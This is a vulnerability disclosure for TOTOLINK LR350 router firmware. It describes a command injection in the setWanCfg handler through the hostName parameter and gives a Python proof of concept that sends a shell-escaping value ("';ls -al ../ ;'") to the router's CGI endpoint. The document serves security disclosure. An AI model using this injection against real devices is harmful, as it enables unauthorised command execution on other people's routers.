## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=75&ids=36

## Affected version

LR350 V9.3.5u.6369_B20220309

## Vulnerability details

In the LR350 V9.3.5u.6369_B20220309 firmware has a command injection vulnerability in the `setWanCfg` function. The `v48` variable receives the `hostName` parameter from a POST request. However, since the user can control the input of `hostName`, the statement `doSystem` can cause a buffer command injection vulnerability.

![image-20240719022247585](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719022247585.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setWanCfg",
"hostName":"';ls -al ../ ;'",
"proto":"80"
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719022336777](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719022336777.png)
